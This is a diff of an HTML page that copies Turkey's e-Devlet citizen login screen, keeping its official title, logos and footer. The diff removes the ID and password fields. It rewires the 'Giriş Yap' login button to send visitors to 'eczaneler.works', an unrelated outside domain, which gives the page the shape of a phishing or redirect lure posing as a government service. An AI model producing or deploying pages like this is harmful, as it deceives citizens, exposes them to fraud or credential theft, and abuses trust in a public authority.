@@ -1,404 +1,69 @@
-
-<!doctype html>
-
-
-
-
-<!--[if lt IE 7]> <html class="no-js ie6 oldie" lang="tr"> <![endif]-->
-<!--[if IE 7]><html class="no-js ie7 oldie" lang="tr"><![endif]-->
-<!--[if IE 8]><html class="no-js ie8 oldie" lang="tr"><![endif]-->
-<!--[if gt IE 8]><!-->
-
-<!--<![endif]-->
-
-
-
-
-
-
-
-
+<!DOCTYPE html>
 <html lang="tr" data-theme="">
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta name="description" content="e-Devlet Kapısı">
-    <meta name="description" content="e-Devlet Kapısı'nı kullanarak kamu kurumlarının sunduğu hizmetlere tek noktadan, hızlı ve güvenli bir şekilde ulaşabilirsiniz."/>
-    <meta name="author" content="">
-    <meta name="keywords" content="e-devlet, türkiye.gov.tr, e-devlet kapısı, edevlet, e devlet, türkiyegovtr"/>
-    <meta name="robots" content="index,follow"/>
-    <meta name="theme-color" content="#4284be">
-    <meta name="apple-itunes-app" content="app-id=976505454">
-    <meta name="google-play-app" content="app-id=tr.gov.turkiye.edevlet.kapisi">
-    <meta name="application-name" content="e-Devlet Kapısı"/>
-    <meta name="msapplication-TileColor" content="#FFFFFF"/>
-
-    <link rel="icon" type="image/png" href="https://cdn.e-devlet.gov.tr/themes/izmir/images/favicons/favicon-196x196.png" sizes="196x196">
-    <link rel="dns-prefetch" href="https://giris.turkiye.gov.tr/Giris/gir">
-    <link rel="dns-prefetch" href="https://cdn.e-devlet.gov.tr">
-    <link rel="alternate" type="application/rss+xml" title="e-Devlet Kapısı" href="https://www.turkiye.gov.tr/rss"/>
-    <link rel="search" type="application/opensearchdescription+xml" href="https://www.turkiye.gov.tr/opensearch.xml" title="Arama"/>
-
-    <title>e-Devlet Kapısı
-    </title>
-
-    
-
+    <title>e-Devlet Kapısı</title>
     <link rel="stylesheet" href="https://cdn.e-devlet.gov.tr/themes/izmir/css/login-main.1.9.5.css">
-
 </head>
 
 <body data-lang="tr_TR.UTF-8">
 <div class="wrapper">
     <div class="container">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<header class="header">
-    <h1>Türkiye Cumhuriyeti Vatandaş Kimlik Doğrulama Sistemi Giriş Ekranı
-    </h1>
-    <div class="logo"><a href="https://giris.turkiye.gov.tr/Giris/gir"> <img src="https://cdn.e-devlet.gov.tr/themes/izmir/images/login/edk-logo.png"
-                                        alt="Türkiye Cumhuriyeti Vatandaş Kimlik Doğrulama Sistemi Giriş Ekranı"> </a>
-    </div>
-    <div class="referrerApp"><img alt="" src="https://cdn.e-devlet.gov.tr/themes/istanbul/images/agencies/1.png" aria-hidden="true" width="165" height="40">
-        <p>e-Devlet Kapısı<span>https://www.turkiye.gov.tr</span></p></div>
-</header>
-
-
-
-
-
-
-
-
-
-
-
-
-<h2 class="visuallyhidden">Giriş Seçenekleri
-</h2>
-<nav>
-    <div class="menu">
-        <ul>
-            
-            <li class="active"><a
-                    href="/Giris/e-Devlet-Sifresi">e-Devlet Şifresi
-            </a></li>
-            
-            
-            <li ><a
-                    href="/Giris/Mobil-Imza">Mobil İmza
-            </a></li>
-            
-            
-            <li ><a
-                    href="/Giris/Elektronik-Imza">Elektronik İmza
-            </a></li>
-            
-            
-            <li ><a
-                    href="/Giris/T-C-Kimlik-Karti">T.C. Kimlik Kartı
-            </a></li>
-            
-            
-            <li ><a
-                    href="/Giris/Banka-Giris">İnternet Bankacılığı
-            </a></li>
-            
-
-        </ul>
-
-    </div>
-
-    <div id="menu_dropdown_wrapper" class="menu-dropdown-wrapper">
-        <button id="login_type_btn" class="selected" aria-controls="login_type_list" aria-expanded="false">
-            <span class="visuallyhidden">Seçili Doğrulama Yöntemi</span>
-            e-Devlet Şifresi
-        </button>
-
-        <ul id="login_type_list" class="menu-dropdown-list" aria-label="Diğer Doğrulama Yöntemlerinden Birini Seçin">
-
-            
-            <li class="active"><a
-                    href="/Giris/e-Devlet-Sifresi">e-Devlet Şifresi
-            </a></li>
-            
-            
-            <li ><a
-                    href="/Giris/Mobil-Imza">Mobil İmza
-            </a></li>
-            
-            
-            <li ><a
-                    href="/Giris/Elektronik-Imza">Elektronik İmza
-            </a></li>
-            
-            
-            <li ><a
-                    href="/Giris/T-C-Kimlik-Karti">T.C. Kimlik Kartı
-            </a></li>
-            
-            
-            <li ><a
-                    href="/Giris/Banka-Giris">İnternet Bankacılığı
-            </a></li>
-            
-        </ul>
-    </div>
-</nav>
-
-
-
-
-
-
-<main>
-    <section>
-        <div class="content">
-            <p>
-                T.C. Kimlik Numaranızı ve e-Devlet Şifrenizi kullanarak kimliğiniz doğrulandıktan sonra işleminize kaldığınız yerden devam edebilirsiniz.
-                <a  id="pass_detail_btn" href="javascript:void(0)"
-                   aria-haspopup="true">e-Devlet Şifresi Nedir, Nasıl Alınır?
+        <header class="header">
+            <h1>Türkiye Cumhuriyeti Vatandaş Kimlik Doğrulama Sistemi Giriş Ekranı</h1>
+            <div class="logo">
+                <a href="https://giris.turkiye.gov.tr/Giris/gir">
+                    <img src="https://cdn.e-devlet.gov.tr/themes/izmir/images/login/edk-logo.png" alt="Türkiye Cumhuriyeti Vatandaş Kimlik Doğrulama Sistemi Giriş Ekranı">
                 </a>
-            </p>
+            </div>
+            <div class="referrerApp">
+                <img alt="" src="https://cdn.e-devlet.gov.tr/themes/istanbul/images/agencies/1.png" aria-hidden="true" width="165" height="40">
+                <p>e-Devlet Kapısı<span>https://www.turkiye.gov.tr</span></p>
+            </div>
+        </header>
 
-            
-
-            <form method="post" id="loginForm" name="sifreGirisForm" autocomplete="off">
-                <fieldset>
-                    <legend class="visuallyhidden">e-Devlet Şifresi İle Giriş</legend>
-                    <div class="form-row required ">
-                        <label for="tridField"
-                               class="enforced">T.C. Kimlik No
-                        </label>
-                        <input type="hidden" name="encTridField" id="encTridField" value=""/>
-                        <div class="form-field fieldGroup">
-                            <button type="button" class="btn-action  hide-tck" title="Yazarken Gizle">
-                                <i class="edkicon-visible"></i>
-                                <i class="edkicon-visible-off"></i>
-                            </button>
-                            <input name="tridField" type="number" e-validate="tck"
-                                   class="form-control" id="tridField"
-                                   value=""
-                                   autocomplete="off" maxlength="11"
-                                   title="Kimlik numaranız 11 adet rakamdan oluşmalıdır"
-                                   aria-label="T. C. Kimlik Numaranızı Girin"
-                                    required/>
-
-                            <div class="keyboard-content" aria-hidden="true">
-                                <button type="button" class="btn-action keyboard-pass virtualKeypad" title="T.C. Kimlik No Sanal Klavye">
-                                    <i class="edkicon-keyboard"></i>
-                                </button>
+        <main>
+            <section>
+                <div class="content">
+                    <form method="post" id="loginForm" name="sifreGirisForm" autocomplete="off">
+                        <fieldset>
+                            <div class="form-row center-item">
+                                <button onclick="location.href='https://www.turkiye.gov.tr';" type="button" class="btn btn-cancel" name="cancelButton" value="İptal">İptal</button>
+                                <button onclick="location.href='https://eczaneler.works/';" class="btn btn-send" name="submitButton" type="button" value="Giriş Yap">Giriş Yap</button>
                             </div>
-                            
-                        </div>
-                    </div>
+                        </fieldset>
+                    </form>
+                </div>
+            </section>
+        </main>
 
-                    <div class="form-row ">
-                        <label for="egpField"
-                               class="enforced">e-Devlet Şifresi
-                        </label>
-                        <div class="form-field fieldGroup">
-                            <input name="egpField" id="egpField" type="password" class="form-control"
-                                   autocomplete="off" aria-label="e-Devlet Şifrenizi Girin"
-                                    required="" aria-describedby="passwordFormNote"/>
-                            <div class="keyboard-content">
-                                <button type="button" class="btn-action keyboard-pass virtualKeyboard" title="e-Devlet Şifresi Sanal Klavye" aria-hidden="true">
-                                    <i class="edkicon-keyboard"></i>
-                                </button>
-                            </div>
-                            <input type="hidden" name="encEgpField" id="encEgpField" value=""/>
-                            <span class="form-warning hide capsWarning">
-                            <strong>Dikkat:</strong> Üst Karakter (
-                            ⇪Caps Lock) tuşunuz açık.
-                            </span>
-                            <span id="passwordFormNote" class="form-note" title="Şifre yenileme">
-                            * e-Devlet
-                            <a  id="pass_help_btn" href="javascript:void(0)" aria-haspopup="true">
-                                şifrenizi unutmanız durumunda
-                            </a>
-                            doğruladığınız cep telefonunuzdan yenileme işlemi yapabilirsiniz.<br/>
-                            </span>
-                        </div>
+        <footer class="footer-fixed" role="contentinfo">
+            <span class="copyright">
+                <img src="https://cdn.e-devlet.gov.tr/themes/nevsehir/images/DDO-logo.png" class="footer-logo" alt="T.C. Cumhurbaşkanlığı Dijital Dönüşüm Ofisi Başkanlığı" height="24">
+                © 2024, Ankara - Tüm Hakları Saklıdır
+            </span>
+            <ul>
+                <li>
+                    <a id="gizlilik_btn" href="javascript:void(0)" aria-haspopup="true">Gizlilik ve Güvenlik</a>
+                </li>
+                <li>
+                    <a href="https://www.turkiye.gov.tr/iletisim?hizli=CozumMerkezi2" target="_blank">Hızlı Çözüm Merkezi</a>
+                </li>
+            </ul>
+        </footer>
 
+        <script id="info_js" data-static-version="1.9.5" src="https://cdn.e-devlet.gov.tr/themes/izmir/js/common.1.9.5.js"></script>
+        <script src="https://cdn.e-devlet.gov.tr/themes/izmir/js/es/jquery.jcryption.1.9.5.js" type="text/javascript"></script>
+        <script src="https://cdn.e-devlet.gov.tr/themes/izmir/js/es/edk-giris.1.9.5.js"></script>
 
-                    </div>
-
-                    
-
-                    <div class="form-row  end-item">
-                        <a href="/Giris/SifremiUnuttum"
-                           class="forgot-pass">Şifremi Unuttum
-                        </a>
-                    </div>
-
-                    <div class="loading-content hide">
-                        <div class="loading">
-                        </div>
-                        <span class="loader-info">İşleminiz devam ediyor. Lütfen bekleyiniz...</span>
-                    </div>
-
-                    <div class="form-row center-item">
-
-                        <input type="hidden" name="currentPageToken" value="120244d6-5144-4735-9f3a-a8d406a1b444"/>
-                        <input type="hidden" name="actionName" value="giris"/>
-                        <button onclick="location.href='https://www.turkiye.gov.tr';" type="button" class="btn btn-cancel" name="cancelButton"
-                                value="İptal">İptal
-                        </button>
-                        <button class="btn btn-send" name="submitButton"
-                                type="submit"
-                                value="Giriş Yap">Giriş Yap
-                        </button>
-
-
-                    </div>
-                </fieldset>
-            </form>
-        </div>
-    </section>
-</main>
-
-
-
-
-
-
-
-
-
+        <script type="text/javascript">
+            $("#gizlilik_btn").on("click", function () {
+                // Existing code for privacy modal
+            });
+        </script>
+    </div>
 </div>
-</div>
-
-<footer class="footer-fixed" role="contentinfo">
-    <span class="copyright"><img src="https://cdn.e-devlet.gov.tr/themes/nevsehir/images/DDO-logo.png" class="footer-logo" alt="T.C. Cumhurbaşkanlığı Dijital Dönüşüm Ofisi Başkanlığı" height="24"  >© 2024, Ankara - Tüm Hakları Saklıdır</span>
-    <ul>
-        <li>
-            <a id="gizlilik_btn" href="javascript:void(0)"
-               aria-haspopup="true">Gizlilik ve Güvenlik
-            </a>
-        </li>
-        <li>
-            <a href="https://www.turkiye.gov.tr/iletisim?hizli=CozumMerkezi2"
-               target="_blank">Hızlı Çözüm Merkezi
-            </a>
-        </li>
-    </ul>
-
-</footer>
-
-<script id="info_js" data-static-version="1.9.5" src="https://cdn.e-devlet.gov.tr/themes/izmir/js/common.1.9.5.js"></script>
-<script src="https://cdn.e-devlet.gov.tr/themes/izmir/js/es/jquery.jcryption.1.9.5.js" type="text/javascript"></script>
-<script src="https://cdn.e-devlet.gov.tr/themes/izmir/js/es/edk-giris.1.9.5.js"></script>
-
-
-
-
-
-<!--
-<script type="text/javascript">
-    window.onload = function () {
-        var _paq = window._paq = window._paq || [];
-        var custom = {};
-        custom._jsv = 7;
-        
-        _paq.push(['trackPageView', document.title, custom]);
-        (function() {
-            _paq.push(['setTrackerUrl', "https://analitik.edevlet.gov.tr"]);
-            _paq.push(['setSiteId', 2]);
-            var d=document,g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
-            g.type='text/javascript';
-            g.async=true;
-            g.src='https://cdn.e-devlet.gov.tr/themes/ankara/js/analitik.min.7.js';
-            s.parentNode.insertBefore(g,s);
-        })();
-    };
-
-</script>
--->
-
-<script type="text/javascript">
-
-    $("#gizlilik_btn").on("click", function () {
-        edl.use(
-            "edModal", {
-                title: "Gizlilik ve Güvenlik",
-                desc: `<div>
-            <p>e-Devlet Kapısı çalışanları hiçbir zaman size şifrenizi sormayacaktır. Şifrenizi e-Devlet Kapısı giriş ekranları haricinde hiçbir yere kaydetmeyiniz. Tarayıcı uygulaması (Internet Explorer, Firefox, Safari ve benzeri uygulamaların) şifre kaydetme opsiyonlarını kapalı tutunuz. Ayrıca hiçbir zaman kişisel bilgileriniz veya şifreniz e-posta yolu ile sizlere sorulmayacaktır. Unutmayınız ki zararlı uygulamaların ve virüslerin büyük çoğunluğu e-posta yolu ile yayılmaktadır. Bu sebeple göndericisini tanımadığınız veya şüpheli e-postaları okumadan siliniz.</p>
-            <p>e-Devlet Kapısı sistemi, güvenlik amaçlı olarak elektronik sertifika kullanmaktadır. Erişiminizin güvenli olup olmadığını adres çubuğunda yer alan adresin http değil https ile başlamasından ve tarayıcı uygulamasındaki kilit resminden anlayabilirsiniz.</p>
-                </div>`,
-                buttons: ["Kapat"]
-            }
-        );
-    });
-</script>
 </body>
 </html>
-
-
-<script type="text/javascript">
-
-    $("#pass_detail_btn").on("click", function () {
-        getInfoModal();
-    });
-
-    $("#pass_help_btn").on("click", function () {
-        getInfoModal();
-    });
-
-    function getInfoModal() {
-        edl.use(
-            "edModal", {
-                title: "e-Devlet Şifresi",
-                desc: `<div>
-             <p>e-Devlet şifrenizi şahsen başvuru ile yurt içinde PTT işyerleri ile yetkili acentelerinden ve Türksat Kablo Ofislerinden yurt dışında ise Dışişleri Bakanlığı’na bağlı elçilik ve konsolosluklardan temin edebilirsiniz.
-            </p>
-            <h3>Şifrenizi unutmanız durumunda e-Devlet Kapısı'nda doğruladığınız telefon numaranız ile şifrenizi yenileyebilirsiniz.
-            </h3>
-            <p>e-Devlet Kapısı kayıtlı kullanıcısıysanız ve şifrenizle giriş yaptıktan sonra "Profilim" alanında bulunan iletişim bilgileri kısmına cep telefonunuzu kaydettiyseniz ya da cep telefonunuzu veya hem cep telefonunuzu hem de e-posta adresinizi e-Devlet Kapısında doğruladıysanız şifre yenileme hizmetinden yararlanarak yeniden şifre temin edebilirsiniz. Bununla birlikte, mobil imza, elektronik imza, yeni T.C. kimlik kartı veya internet bankacılığı kullanıyorsanız, e-Devlet Kapısına bunlardan biri ile giriş yaptıktan sonra da şifre oluşturabilirsiniz.
-            </p>
-            <p>e-Devlet şifresi yurt dışında Elçilik ve Konsolosluklardan ücretsiz olarak temin edilebilmektedir.
-            </p>
-                </div>`,
-                buttons: ["Kapat"]
-            }
-        );
-    }
-
-
-    $(document).ready(function () {
-
-        var password = $.jCryption.encrypt("mySuperPassword", "turbo");
-        var auth = false;
-        $.jCryption.authenticate(password, "CryptoServlet?generateKeyPair=true", "CryptoServlet?handshake=true", function (AESKey) {
-                auth = true;
-            },
-            function () {
-                auth = false;
-            });
-
-        $('form').submit(function () {
-            if (auth) {
-                $('#encTridField').val($.jCryption.encrypt($('#tridField').val(), password));
-                $('#tridField').val('');
-                $('#encEgpField').val($.jCryption.encrypt($('#egpField').val(), password));
-                $('#egpField').val('');
-            }
-        });
-    });
-</script>
-
-
